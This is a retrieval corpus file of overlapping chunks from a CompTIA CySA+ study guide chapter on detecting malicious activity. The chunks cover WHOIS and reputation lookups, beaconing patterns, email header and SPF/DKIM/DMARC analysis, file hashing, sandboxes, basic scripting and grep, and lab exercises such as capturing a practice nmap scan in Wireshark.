1994-­10-­12T00:00:00Z Registrar Registration Expiration Date: 2023-­ 10-­ 11T04:00:00Z Registrar: CSC CORPORATE DOMAINS, INC. Sponsoring Registrar IANA ID: 299 Registrar Abuse Contact Email: domainabuse@cscglobal.com Registrar Abuse Contact Phone: +1.8887802723 Domain Status: clientTransferProhibited http://www.icann.org/ epp#clientTransferProhibited Registry Registrant ID: Registrant Name: Domain Administrator Registrant Organization: John Wiley & Sons, Inc Registrant Street: 111 River Street Registrant City: Hoboken Registrant State/Province: NJ Registrant Postal Code: 07030 Registrant Country: US Registrant Phone: +1.3175723355 Registrant Phone Ext: Registrant Fax: +1.3175724355 Registrant Fax Ext: Registrant Email: domains@wiley.com Registry Admin ID: Admin Name: Domain Administrator Admin Organization: John Wiley & Sons, Inc Admin Street: 111 River Street Admin City: Hoboken Admin State/Province: NJ Admin Postal Code: 07030 Admin Country: US 114 Chapter 3 ■ Malicious Activity Admin Phone: +1.3175723355 Admin Phone Ext: Admin Fax: +1.3175724355 Admin
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Domain Status: clientTransferProhibited http://www.icann.org/ epp#clientTransferProhibited Registry Registrant ID: Registrant Name: Domain Administrator Registrant Organization: John Wiley & Sons, Inc Registrant Street: 111 River Street Registrant City: Hoboken Registrant State/Province: NJ Registrant Postal Code: 07030 Registrant Country: US Registrant Phone: +1.3175723355 Registrant Phone Ext: Registrant Fax: +1.3175724355 Registrant Fax Ext: Registrant Email: domains@wiley.com Registry Admin ID: Admin Name: Domain Administrator Admin Organization: John Wiley & Sons, Inc Admin Street: 111 River Street Admin City: Hoboken Admin State/Province: NJ Admin Postal Code: 07030 Admin Country: US 114 Chapter 3 ■ Malicious Activity Admin Phone: +1.3175723355 Admin Phone Ext: Admin Fax: +1.3175724355 Admin Fax Ext: Admin Email: domains@wiley.com Public tools like AbuseIPDB allow you to search for IP addresses, domains, or networks to see if they’ve been reported for abuse. While AbuseIPDB is specifically included in the CySA+ exam outline, similar commercial and free services are broadly available and also exist for email abuse tracking. Figure 3.14 shows sample output from an AbuseIPDB report on an IP address with recent reports of abusive activities. F I G U R E 3 . 14 AbuseIPDB output for an IP address Security administrators often have to consider what they would do to get off of a list like the AbuseIPDB service provides if systems they are responsible for were compromised. While each site varies, almost all have a process to request to be removed. Common Techniques There are a number of techniques that you’ll need to be familiar with for the exam. The first is pattern recognition—­the ability to see common attack, exploit, and compromise patterns and to identify them for what they are. This is commonly used by artificial intelligence (AI) of machine learning (ML) systems that look for known patterns associated with compromise or malicious activity. Security practitioners also look for patterns that may indicate compromise or attack. Determining Malicious Activity Using Tools and Techniques 115 One of the most common focuses for pattern recognition techniques is to identify command-and-control (C&C) traffic, or beaconing. Command-and-control traffic identification relies on patterns like these: ■■ Traffic to known malicious IP addresses or networks ■■ Traffic on unexpected ports ■■ ■■ ■■ Traffic via protocols that are not typically in use, or outside the scope of normal traffic via that protocol Large data transfers Traffic associated with processes that typically would not send traffic like notepad.exe on a Windows system ■■ Traffic sent at times of the day that are not associated with normal business ■■ Other unexpected behaviors that do not match typical usage or patterns Although the CySA+ exam outline focuses on C&C and pattern recognition, advanced AI and ML techniques use a wide range of indicators of compromise and baselining techniques to help to identify potentially unwanted or malicious activity and offer the advantage of automation and scale. Protecting and Analyzing Email Email remains a frequent vector for attacks, ranging from phishing attacks to spreading malware as email attachments or via other techniques. Security analysts need to know the basics of email analysis,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the day that are not associated with normal business ■■ Other unexpected behaviors that do not match typical usage or patterns Although the CySA+ exam outline focuses on C&C and pattern recognition, advanced AI and ML techniques use a wide range of indicators of compromise and baselining techniques to help to identify potentially unwanted or malicious activity and offer the advantage of automation and scale. Protecting and Analyzing Email Email remains a frequent vector for attacks, ranging from phishing attacks to spreading malware as email attachments or via other techniques. Security analysts need to know the basics of email analysis, including how to analyze email headers, how to identify common attack techniques, and the most common security techniques intended to prevent email attacks. Exam Note The CySA+ exam outline broadly describes a wide range of email protection, antispam and antiphishing techniques, and general email analysis and review skills as “email analysis.” We have broken them down into analysis techniques and email security options. Analyzing Email Most organizations use automated email analysis as a first line of defense against malicious and spam emails. Automated tools look for indicators like known malicious or spam senders, often using block lists built using information from around the world. They also scan every email looking for malicious payloads like malware or other unwanted files. The same tools often perform header analysis and message content analysis. Header analysis looks at the content of the email’s header. An example of a header from a spam email 116 Chapter 3 ■ Malicious Activity is shown in Figure 3.15. Note that the first two lines state that SPF is neutral. Further down we see that a domain notes.langdale.com is mentioned as well as a received from header entry that shows as efianalytics.com. The extensive reply-­to list is strange, as is the message ID found later in the email. F I G U R E 3 . 15 Headers from a phishing email This email was a very obvious phishing attempt; however, more elaborate and skilled attackers will have fewer obvious issues in both the body of the message and the headers themselves. Legitimate accounts are popular targets of attackers because they can be used to bypass many spam filters and will be more likely to be successful in phishing attacks. If you’re not familiar with the contents of an email header, you can review them at http://mediatemple.net/community/products/dv/204643950/ understanding-­an-­email-­header or https://blog.mailfence.com/email-­ header, among many other sites. Email header analysis tools can also be handy, and many sites provide them, including www.whatismyip.com/email-­header-­analyzer and https://dnschecker .org/email-­header-­analyzer.php. You won’t have access to automated tools like these on the CySA+ exam, so make sure you know how to read a header without help! It is important for analysts to know that forwarded email messages will not include the original headers. Forwarding an email places the message content into a new mail “envelope,” removing the header information that you may need to investigate it. Most modern email clients do allow users to view headers if
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	https://blog.mailfence.com/email-­ header, among many other sites. Email header analysis tools can also be handy, and many sites provide them, including www.whatismyip.com/email-­header-­analyzer and https://dnschecker .org/email-­header-­analyzer.php. You won’t have access to automated tools like these on the CySA+ exam, so make sure you know how to read a header without help! It is important for analysts to know that forwarded email messages will not include the original headers. Forwarding an email places the message content into a new mail “envelope,” removing the header information that you may need to investigate it. Most modern email clients do allow users to view headers if desired, but that is normally a manual process and isn’t something most users will know how to do without instructions. Determining Malicious Activity Using Tools and Techniques 117 Sender Policy Framework (SPF), which we talk about in a moment, breaks when email is forwarded because the forwarding sender will now be the sender and SPF checks may fail at the new destination. In addition to the information that can be lost when an email is forwarded, automatic email forwarding is a security concern that organizations need to address as well. Automatic forwarding is sometimes used by attackers who have successfully compromised an account to send all the emails received by that account to a destination of their choosing. Even if the account hasn’t been compromised, forwarding can cause internal data that your organization doesn’t want to leave to be outside your security perimeter. Email Elements In addition to the header, a number of elements may be of concern while performing email analysis. The first, and most common, element to review is an embedded link. Embedded links are often used as part of phishing scams because many users do not check where the link leads before clicking them. Since an embedded link can differ from the text that it is linked to, many users fall for this technique. Even more sophisticated users may fall for URLs that appear to be legitimate at first glance. Fortunately, email security tools can scan for malicious links and will block many, though not all, links like this. Email signature blocks can be useful to help identify phishing attacks, although more sophisticated attackers will simply clone legitimate signatures. Since email signatures often contain images and embedded links, they may also contain other dangerous elements that tell attackers if an email was opened or may actually be part of the attack. Digital signatures rely on digital certificates and public key encryption and can help prove that the actual claimed sender was the real sender of the message and that the content of the message was not changed. When an email is digitally signed, a hash is created; then that hash is encrypted with the signer’s private key to create the digital signature. The sender’s digital certificate and signature are attached to the email. Recipients can then validate the hash against the email they received and can also decrypt the signature using the sender’s public key, verifying that
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	part of the attack. Digital signatures rely on digital certificates and public key encryption and can help prove that the actual claimed sender was the real sender of the message and that the content of the message was not changed. When an email is digitally signed, a hash is created; then that hash is encrypted with the signer’s private key to create the digital signature. The sender’s digital certificate and signature are attached to the email. Recipients can then validate the hash against the email they received and can also decrypt the signature using the sender’s public key, verifying that it matches. Many email services provide support for digital signatures and tools like S/MIME (Secure/Multipurpose Internet Mail Extensions), but relatively few organizations make broad use of this capability. Email Attacks The most common forms of email attacks are phishing, impersonation, and the inclusion of malicious attachments. Phishing attacks focus on attempts to get unsuspecting users to click through to a site where they will provide their username and password, or other techniques that are focused on getting credentials or other information through deception. Impersonation attacks are increasingly common, and they often include an email purporting to be from a trusted coworker or manager. The recipient is typically asked to perform an action like buying gift cards, changing banking information, or otherwise doing something that will benefit the attacker. 118 Chapter 3 ■ Malicious Activity Malware is also spread via email, either as an attachment or via a clickable download link. Although antimalware software can help with this, there is a constant battle between attackers and defenders, and new techniques and tools appear all the time that help attackers get malicious software through the defenses that organizations have put into place. Email Security Options In addition to header analysis, additional technologies can be used to help provide greater protection to emails. These include the DomainKeys Identified Mail (DKIM), the Sender Policy Framework (SPF), and Domain-­Based Message Authentication, Reporting, and Conformance (DMARC). DKIM allows organizations to add content to messages to identify them as being from their domain. DKIM signs both the body of the message and elements of the header, helping to ensure that the message is actually from the organization it claims to be from. It adds a DKIM-­Signature header, which can be checked against the public key that is stored in public DNS entries for DKIM-­enabled organizations. SPF is an email authentication technique that allows organizations to publish a list of their authorized email servers. SPF records are added to the DNS information for your domain, and they specify which systems are allowed to send email from that domain. Systems not listed in SPF will be rejected. SPF records in DNS are limited to 255 characters. This can make it tricky to use SPF for organizations that have a lot of email servers or that work with multiple external senders. In fact, SPF has a number of issues you can run into—­you can read more about some of them
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	an email authentication technique that allows organizations to publish a list of their authorized email servers. SPF records are added to the DNS information for your domain, and they specify which systems are allowed to send email from that domain. Systems not listed in SPF will be rejected. SPF records in DNS are limited to 255 characters. This can make it tricky to use SPF for organizations that have a lot of email servers or that work with multiple external senders. In fact, SPF has a number of issues you can run into—­you can read more about some of them at www .dmarcanalyzer.com/spf. DMARC is a protocol that uses SPF and DKIM to determine whether an email message is authentic. Like SPF and DKIM, DMARC records are published in DNS, but unlike DKIM and SPF, DMARC can be used to determine if you should accept a message from a sender. Using DMARC, you can choose to reject or quarantine messages that are not sent by a DMARC-­supporting sender. You can read an overview of DMARC at https://dmarc .org/overview. If you want to see an example of a DMARC record, you can check out the DMARC information for SendGrid by using a dig command from a Linux command prompt: dig txt_dmarc.sendgrid.net. You should see something that looks like the following graphic: Determining Malicious Activity Using Tools and Techniques 119 If you do choose to implement DMARC, you should set it up with the none flag for policies and review your data reports before going further to make sure you won’t be inadvertently blocking important email. Although many major email services are already using DMARC, smaller providers and organizations may not be. File Analysis Analyzing files for potentially malicious content and activity can be a complex activity. Tools used by attackers often obfuscate malicious content using packing and encryption capabilities, making it hard to directly analyze files without taking additional action. There are some simple steps that security practitioners often take to perform quick, manual analysis when possible. The first technique is to use hashing to compare potentially malicious or suspect files to original, known good files. While tools like Tripwire exist that continuously monitor files based on hashes, manual hashing uses SHA256 or even MD5 tools built into Linux and via PowerShell in Windows can be used to compare hashes. Hash functions are functions that map arbitrary data like a file or string to a fixed size output. They’re a one-­directional function, meaning that you can’t derive the original file from a hash, but a good hash function will not generate duplicate hashes unless a file exactly matches the original file that was input to the hash function. This makes them very useful for validating that a file hasn’t been changed. 120 Chapter 3 ■ Malicious Activity A second common technique is searching files for strings, recoverable text from binary files. This can be really useful when you want to look at a compiled program like an executable to see what
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	or string to a fixed size output. They’re a one-­directional function, meaning that you can’t derive the original file from a hash, but a good hash function will not generate duplicate hashes unless a file exactly matches the original file that was input to the hash function. This makes them very useful for validating that a file hasn’t been changed. 120 Chapter 3 ■ Malicious Activity A second common technique is searching files for strings, recoverable text from binary files. This can be really useful when you want to look at a compiled program like an executable to see what it might do. The Linux strings command can help you analyze a file by combing through the file and showing you those strings in a human-­readable list. While the strings command isn’t listed in the exam outline, techniques like using strings to take a quick look at a suspect file are commonly part of file analysis. The good news for test takers is that the CySA+ exam outline doesn’t dive into packers and other obfuscation methods. Instead, it just mentions hashing. Thus, while you need to know about hashing for the exam, you should expect real-­world analysis requirements to likely be much more challenging! Sandboxing The last tools that the CySA+ exam outline points to for determining malicious activity are sandboxing tools. Sandboxes establish a safe, instrumented environment where you can run potentially malicious files and applications to determine what they attempt to do and how they do it. There are many online sandbox options, but there are two that are specifically mentioned in the exam outline. The first is Joe Sandbox, a commercial sandbox service with a free basic option that can test against multiple operating systems as well as allowing advanced options using a set of parameters and options called a cookbook. Joe Sandbox can be found at: www .joesandbox.com. The other option is Cuckoo Sandbox, an automated malware analysis tool that you can run as a self-­hosted tool. Cuckoo works on more than malware, and also analyzes PDFs; Microsoft Office and other files; and malicious websites. Of course, running Cuckoo yourself means that you need to account for the potential for malicious behavior, so you should isolate the Cuckoo system even though it is designed for safety. You can find Cuckoo Sandbox at cuckoosandbox.org/. Both tools will analyze network traffic and calls to APIs as well as other actions taken by the artifacts that they analyze. If you’re thinking that sandbox tools seem a lot like websites like VirusTotal (www.virustotal.com) where a malware sample can be analyzed, you’re right. While some antivirus (AV) websites simply run multiple AV engines against malware, others use sandbox tools and techniques to analyze the samples to see what they do. Determining Malicious Activity Using Tools and Techniques 121 User Behavior Analysis User behavior analysis relies on an understanding of both typical user behavior and behaviors that are most commonly associated with malicious behavior. Abnormal account activity depends on the account—­a typical
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	other actions taken by the artifacts that they analyze. If you’re thinking that sandbox tools seem a lot like websites like VirusTotal (www.virustotal.com) where a malware sample can be analyzed, you’re right. While some antivirus (AV) websites simply run multiple AV engines against malware, others use sandbox tools and techniques to analyze the samples to see what they do. Determining Malicious Activity Using Tools and Techniques 121 User Behavior Analysis User behavior analysis relies on an understanding of both typical user behavior and behaviors that are most commonly associated with malicious behavior. Abnormal account activity depends on the account—­a typical user is unlikely to attempt to use administrative rights, log in outside of typical hours, or from another country in many cases. Thus, baselines and behavioral analysis are both commonly used to identify users whose behavior may indicate that their account was compromised or that they themselves are performing malicious actions. One common indicator is known as impossible travel, or user logins from different locations that can’t reasonably be explained by travel between those locations. Thus, a user who logs in in the United States at 1 p.m. and then logs in 15 minutes—­or even a few hours later—­from Japan is likely not in both locations at those times and will be marked as suspect. There’s a whole category of tools that focus on user and entity behavior and analysis—­they’re called UEBA, and they look for malicious behavior and other threats based on behavioral analysis and baselines. Data Formats The ability to write and use basic scripts to search for specific items in logs, as well as to do basic text manipulation and other tasks, is required in many security analyst roles. Python is one of the most popular languages right now, but other languages like PowerShell and shell scripting like Bash scripting are still quite common. You should be familiar with a few basic techniques, distinguishing features, and basics of languages for the CySA+ exam. Over the next few pages, we will explore basic “hello world” scripts in both Python and PowerShell to help familiarize you with them. Python is an interpreted programming language used broadly for information security tools and for general-­purpose programming by many security practitioners. Python is arguably the most popular programming language used by developers today. You’ll find it on many Linux systems by default, but it is available for most modern operating systems. We can print output in Python using the print command. Here’s the single line of code that we need to create our “Hello, world!” script for a system with Python installed: print("Hello, world!") If we save that as hello.py, we may then execute it with the following command: Python ./hello.py And, for one last time, we’ll see our output: Hello, world! 122 Chapter 3 ■ Malicious Activity Since Python is an interpreted language, it can simply be run as shown here. That makes Python an easy choice for portable programs that require more complexity than a shell script. Indentation is extremely
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	can print output in Python using the print command. Here’s the single line of code that we need to create our “Hello, world!” script for a system with Python installed: print("Hello, world!") If we save that as hello.py, we may then execute it with the following command: Python ./hello.py And, for one last time, we’ll see our output: Hello, world! 122 Chapter 3 ■ Malicious Activity Since Python is an interpreted language, it can simply be run as shown here. That makes Python an easy choice for portable programs that require more complexity than a shell script. Indentation is extremely important in Python. Although many languages allow you to indent (or not!) code freely, indentation has a specific purpose in Python: it’s used to group statements together. If you indent improperly, your code is likely to behave in an unexpected way. PowerShell is the native shell scripting environment for Windows. It was originally designed by Microsoft for use by Windows system administrators and is now an open source tool available for Windows, Mac, and Linux platforms. However, given the availability of other Unix shells for Mac and Linux systems, PowerShell is still generally associated with the Windows operating system. The most common use case for running PowerShell on non-­ Windows systems is for code compatibility. A shell script is a program that is run by a command-­line interpreter like Bash for Linux/Unix systems or PowerShell for Windows systems. Because shells are a built-­in part of the operating system, shell scripting is a common way to leverage resources that can be expected to be available on most systems. They provide an easy means of file manipulation, program and script execution, and management of file input and output. You’ll find PowerShell preinstalled on Windows systems. To create our “Hello, world!” script in PowerShell, you need just a single line of code: Write-­ Host "Hello, world!" Save your script in a directory on your system using the text editor of your choice. By convention, developers name PowerShell scripts using the .ps1 extension. Once you’ve saved your script, you may then try to run it using this command: .\hello.ps1 If you haven’t used PowerShell scripts on your system before, when you try to execute your first script, you’ll probably see an error message that reads as follows: .\hello.ps1 : File C:\Users\Administrator\hello.ps1 cannot be loaded. The file C:\Users\Administrator\hello.ps1 is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170. At line:1 char:1 + .\hello.ps1 + ~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess Determining Malicious Activity Using Tools and Techniques 123 This error occurs because Windows systems are configured by default to block the execution of PowerShell scripts. You’ll need to change the PowerShell execution policy to allow them to run. There are five possible policies: ■■ ■■ ■■ ■■ ■■ Restricted is the default PowerShell execution policy, and it blocks all use of PowerShell
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170. At line:1 char:1 + .\hello.ps1 + ~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess Determining Malicious Activity Using Tools and Techniques 123 This error occurs because Windows systems are configured by default to block the execution of PowerShell scripts. You’ll need to change the PowerShell execution policy to allow them to run. There are five possible policies: ■■ ■■ ■■ ■■ ■■ Restricted is the default PowerShell execution policy, and it blocks all use of PowerShell scripts. AllSigned requires that any PowerShell scripts that you run are signed by a trusted publisher. RemoteSigned allows the execution of any PowerShell script that you write on the local machine but requires that scripts downloaded from the Internet be signed by a trusted publisher. Unrestricted allows the execution of any PowerShell script but prompts you to confirm your request before allowing you to run a script downloaded from the Internet. Bypass allows the execution of any PowerShell script and does not produce any warnings for scripts downloaded from the Internet. You aren’t a trusted publisher, so you should set the execution policy to RemoteSigned to allow you to run your own scripts but still require that downloaded scripts come from a trusted publisher. You can change the execution policy using this command: Set-­ExecutionPolicy RemoteSigned Note that you must start PowerShell as an administrator to change the execution policy. Once you’ve corrected this, try running the script again and you should see this output: Hello, world! Exam Note There’s a lot more to programming in both of these languages, and if you’re not familiar with them, you may want to dive deeper into them as you prepare for the exam. You should be able to identify PowerShell and Python code and have at least a general idea of what it is doing given a code sample. Regular Expressions and grep Performing string (text) searches with grep is a frequent task for security analysts. You might be able to use the find command inside a graphical text editor, but text output from grep is often fed to other commands or used to quickly find text inside a large file. A basic grep command calls grep and then provides the text you are searching for and the filename: grep cysa example.txt 124 Chapter 3 ■ Malicious Activity You can search multiple files by separating the filenames with commas, search an entire directory by using a -­w flag, and use an asterisk as a wildcard. You can even search for all the lines in a file that don’t contain a specific set of text. Table 3.2 lists some commonly used grep flags. TA B L E 3 . 2 grep flags grep flag Function -­c Counts the number of occurrences -­i Matches both lower and upper case -­n Shows the matching line and line number -­v Shows all lines that do not match
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Chapter 3 ■ Malicious Activity You can search multiple files by separating the filenames with commas, search an entire directory by using a -­w flag, and use an asterisk as a wildcard. You can even search for all the lines in a file that don’t contain a specific set of text. Table 3.2 lists some commonly used grep flags. TA B L E 3 . 2 grep flags grep flag Function -­c Counts the number of occurrences -­i Matches both lower and upper case -­n Shows the matching line and line number -­v Shows all lines that do not match the string -­r Reads all files under each directory recursively -­e When followed by a pattern, uses the pattern for a search (allows multiple patterns) Regular expressions (regex) are also commonly used in grep searches to match a more flexible set of entries. Using letters between square brackets will match any of a set of characters, whereas an * will match any number of occurrences of the previous character. Thus, to match all occurrences of text that matches cysa, cysb, and cysc, you could use the following command: grep "cys[abc]" example.txt grep is a powerful tool and is frequently combined with other command-­line functions to perform complex searches or to prepare data to feed to other tools. You can find a multitude of grep and regex tutorials online. If you haven’t used grep and regular expressions much, or if you’re rusty, you may want to take a bit of time to practice. Grab a large file, like the syslog file from a Linux system, find some text, and build a search query for it. Try matching case-­sensitive and case-­insensitive versions of your query, try it against multiple files, and for the more advanced use cases, you may want to play around with regular expressions. To send data from one command-­line tool to another, you can use a pipe, represented by the | symbol. For example, if you grep for a string and know that you will see multiple Determining Malicious Activity Using Tools and Techniques 125 pages of output and want to paginate the output, you can pipe the output of grep into the more command: grep cysa example.txt | more Knowing how to use pipes to combine data from multiple commands is a useful skill for security analysts, particularly if you want to combine multiple regular expressions. Exam Note You don’t need to be a regex expert for the exam, but you should know the basic concepts of regular expressions. If you don’t use them regularly, check out a quick introduction like the one found at www.regular-­expressions.info/quickstart.html to get you started. Data Formats The CySA+ exam outline also looks at two data formats: JSON and XML. JSON uses JavaScript notation and human-­readable text for data interchange, and XML is a markup language with similar purposes—­it is both machine and human readable, and it has broader applications than JSON does. If you need to determine if a file is encoded
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	You don’t need to be a regex expert for the exam, but you should know the basic concepts of regular expressions. If you don’t use them regularly, check out a quick introduction like the one found at www.regular-­expressions.info/quickstart.html to get you started. Data Formats The CySA+ exam outline also looks at two data formats: JSON and XML. JSON uses JavaScript notation and human-­readable text for data interchange, and XML is a markup language with similar purposes—­it is both machine and human readable, and it has broader applications than JSON does. If you need to determine if a file is encoded in JSON, you can look for curly brackets opening and closing statements. For example, a JSON file might contain the following: { "menu":{ filetype: file "popup":{ menuitem: [ {"value":"Create", "onclick": "NewFile()"} {"value": "Edit", "onclick": "EditFile()"} {"value:" "Delete", "onclick": "DeleteFile()"} ] } } } Note the use of curly brackets and square brackets in the JSON code. A similar XML file would use angle brackets to open and close statements, much like HTML would. For example, the menu items might be listed as: <menuitem value: "Create" onclick="NewFile()" /> 126 Chapter 3 ■ Malicious Activity There’s a lot more to know about JSON and XML, but for the purposes of the exam you can generally read either format to understand what it means since both are logically structured and are generally human readable. Summary Identifying malicious activity requires visibility into networks, systems, services, and applications. Gathering and centralizing information from each component of your organization’s infrastructure and systems can allow you to more easily detect, respond to, or even prevent incidents. The same information can also help you detect indicators of compromise early, potentially allowing you to stop intrusions before they become significant breaches. Network monitoring is often done via router-­based monitoring, which relies on network flows, SNMP, and logging, all common means of gathering information. Flows provide summary data about traffic, protocols, and endpoints; SNMP is used to gather device information; and logging provides insight while also being useful to send to centralized security infrastructure. In addition, organizations employ active monitoring to gather data by sending traffic. Passive monitoring relies on capturing information about the network and its performance as traffic travels through network devices. Passive monitoring doesn’t add traffic to the network and acts after the fact, rather than providing real-­time information, making it more useful for analysis than prevention of issues. Network monitoring tools centralize multiple types of network data and provide both central visibility and detailed drill-­down analysis capabilities. They are important to incident response and event management because they allow both easy visibility and the ability to look at data from multiple data sources in a single place, potentially allowing you to detect problems like link failure, beaconing, and unexpected traffic identified more easily. Attacks and probes can be detected using monitoring tools and sometimes may be identified and then prevented by network security devices. Monitoring hosts requires visibility into resources, applications, and logs. Host resource monitoring
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of issues. Network monitoring tools centralize multiple types of network data and provide both central visibility and detailed drill-­down analysis capabilities. They are important to incident response and event management because they allow both easy visibility and the ability to look at data from multiple data sources in a single place, potentially allowing you to detect problems like link failure, beaconing, and unexpected traffic identified more easily. Attacks and probes can be detected using monitoring tools and sometimes may be identified and then prevented by network security devices. Monitoring hosts requires visibility into resources, applications, and logs. Host resource monitoring typically focuses on processor, memory, and disk utilization, whereas applications are often managed using central management tools. Log monitoring relies on an understanding of what is logged and which issues are important to review. Monitoring for unauthorized changes and behavior are critical parts of host-­related monitoring and analysis for malicious activity. Application issues are often detected by monitoring for service anomalies like errors, failures, or changes in service behavior. Security professionals look for anomalous activity, new and unexpected account creation, unexpected outputs or outbound communication, service interruptions, and memory overflow issues. Much like with network and host data, logs provide critical information about applications as well and are commonly sent to security management and monitoring tools. Tools are an essential part of a security analyst’s practice, including the ability to perform packet capture, log analysis and correlation, endpoint security management and response, Exam Essentials 127 as well as leveraging DNS and IP reputation, performing file analysis, and using sandboxes. Common techniques that are used with these tools include pattern recognition to identify command-and-control traffic, file analysis, user behavior analysis, and of course, email analysis. Analysts also need to be familiar with basic tools for programming and scripting, including Python, PowerShell, Linux shell scripting, and the use of regular expressions. You also need to understand and be able to read JSON-­and XML-­encoded files as part of your security work. Exam Essentials Analyze network-­related potentially malicious activity. Understand how network bandwidth is consumed and how it is related to detecting and analyzing events. Identify and explain common network issues, including bandwidth consumption, beaconing, irregular peer-­to-­peer communications, scans, sweeps, traffic spikes, and unexpected traffic. Understand how to identify activity on unexpected ports as well as how to identify rogue devices. Analyze host-­related potentially malicious activity. Monitoring system resource usage, including CPU, memory, and disk space, can help to identify malicious activity. Understand what unexpected processor, drive, and memory consumption can mean when searching for malicious activity and indicators of compromise. Explain how to identify unauthorized software, filesystem, privilege, and Registry changes as well as malicious processes and unauthorized changes. Leverage built-­in system tools to search for and identify these events and changes. Describe data exfiltration and how to identify it. Explain scheduled tasks and how to search for unauthorized changes to them. Analyze application-­related potentially malicious activity. Use tools and techniques to identify application-­related anomalous activity by reviewing logs, searching for unexpected new
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	disk space, can help to identify malicious activity. Understand what unexpected processor, drive, and memory consumption can mean when searching for malicious activity and indicators of compromise. Explain how to identify unauthorized software, filesystem, privilege, and Registry changes as well as malicious processes and unauthorized changes. Leverage built-­in system tools to search for and identify these events and changes. Describe data exfiltration and how to identify it. Explain scheduled tasks and how to search for unauthorized changes to them. Analyze application-­related potentially malicious activity. Use tools and techniques to identify application-­related anomalous activity by reviewing logs, searching for unexpected new accounts and improper privileges. Review applications for unexpected output and outbound communications that may indicate malicious activity. Identify service interruptions using tools like log analysis and monitoring. Explain and understand the uses of tools in identifying malicious activity. Understand and use packet capture tools like Wireshark and tcpdump. Interpret output from both tools. Explain the uses of SIEM, SOAR, and EDR as well as their differences. Understand the use of DNS and IP reputation services as well as the role of Whois information and abuse databases like AbuseIPDB. Perform file analysis and interpret output of tools like strings and VirusTotal. Explain the purpose and uses of sandboxing tools, including Joe Sandbox and Cuckoo Sandbox, as well as general sandboxing concepts. Use common techniques to identify malicious activity. Leverage pattern recognition techniques to identify malicious activity, particularly command-and-control (C&C) by searching for beaconing and similar indicators. Understand commons Linux and Windows commands, 128 Chapter 3 ■ Malicious Activity know why they might be suspicious, and interpret them. Perform common email analysis including headers. Explain why embedded links can be dangerous. Understand DKIM, DMARC, and SPF. Conduct file analysis using hashing and other tools. Leverage user behavior analysis techniques to identify abnormal account activity like impossible travel. Leverage programming languages and data formats as part of malicious activity identification. Read and understand both JSON and XML. Read and understand what Python, PowerShell, and Linux shell scripts are doing. Use basic regular expressions for data and file analysis. Lab Exercises Activity 3.1: Identify a Network Scan In this lab you will use Wireshark to identify a network scan of a Linux system. Part 1: Boot a Kali Linux system and a target system and set up the exercise 1. Start your Kali Linux virtual machine and the Metasploitable virtual machine; log into both. 2. Open a terminal window and Wireshark on the Kali Linux system (Wireshark can be found in the Applications menu under option 09 Sniffing & Spoofing). 3. Determine the IP address of the target system. From the command prompt on the Metasploitable system, enter ifconfig -­a and record its IP address. 4. Start the Wireshark capture. Select the eth0 interface and then choose Capture ➢ Start. Part 2: Perform a network scan and visit the web server 1. From the terminal, execute the following command: nmap -­p 1-­65535 [ip address of the Metasploitable machine]. 2. Record one of the ports
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	2. Open a terminal window and Wireshark on the Kali Linux system (Wireshark can be found in the Applications menu under option 09 Sniffing & Spoofing). 3. Determine the IP address of the target system. From the command prompt on the Metasploitable system, enter ifconfig -­a and record its IP address. 4. Start the Wireshark capture. Select the eth0 interface and then choose Capture ➢ Start. Part 2: Perform a network scan and visit the web server 1. From the terminal, execute the following command: nmap -­p 1-­65535 [ip address of the Metasploitable machine]. 2. Record one of the ports listed as open. 3. Start the IceWeasel browser in Kali and navigate to the IP address of the Metasploitable system. Part 3: Identify scan traffic 1. Stop the Wireshark capture. Click the red square stop button at the top left of the Wireshark screen. 2. Review the traffic you captured. Search for the port you found by entering tcp .port==[port you identified] in the Filter box. Lab Exercises 129 3. What traffic was sent? If you rerun this scan with other TCP connection options like -­sS or -­ST, does this change? 4. Review traffic for port 80. You should see both the scan and a visit from the Kali Linux web browser. How do these differ? Activity 3.2: Write an Application and Service Issue Response Plan Write an identification and response plan for applications and services that an organization you are familiar with relies on. Your response plan should presume that a service issue or outage has been reported but that the cause is not known. Ensure that you cover key elements discussed in this chapter, including: ■■ How you would identify potential issues using the application and system logs. Can you identify unexpected behaviors? ■■ How you would monitor the service for problems. ■■ What types of issues you would look for. ■■ What the organization’s response should be. Once you have completed your plan, walk through it using an example issue. Ensure that your plan would address the issue and that you would be able to provide a complete report to your organization’s management about the issue. Activity 3.3: Analyze a Phishing Email You probably already have great source material for this lab exercise: simply open your email spam folder and find a likely phishing attack email. Part 1: Manually analyze an email header Once you have identified a suspected phishing email, you will need to open the headers for the email. If you’re not familiar with the process, most email providers have help available on how to access the headers. It can help to print the headers out for analysis or to import them into your favorite text editor to allow for markup as you track what you have found. Review the headers and identify what clues you can find about where it was sent from, who sent it, and what path it traveled before you received it. What red flags stand out, and what would you
